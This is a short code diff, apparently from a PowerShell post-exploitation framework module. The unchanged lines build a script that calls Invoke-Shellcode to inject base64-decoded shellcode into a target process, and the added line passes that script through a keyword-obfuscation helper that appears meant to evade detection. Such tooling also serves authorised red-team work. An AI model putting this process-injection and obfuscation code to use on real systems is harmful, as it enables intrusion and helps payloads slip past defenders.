@@ -161,5 +161,6 @@ class Module(object):
         #pow_array = "@(0x" + pow_array + " )"
         script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(procID, encoded_sc)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
 
         return script
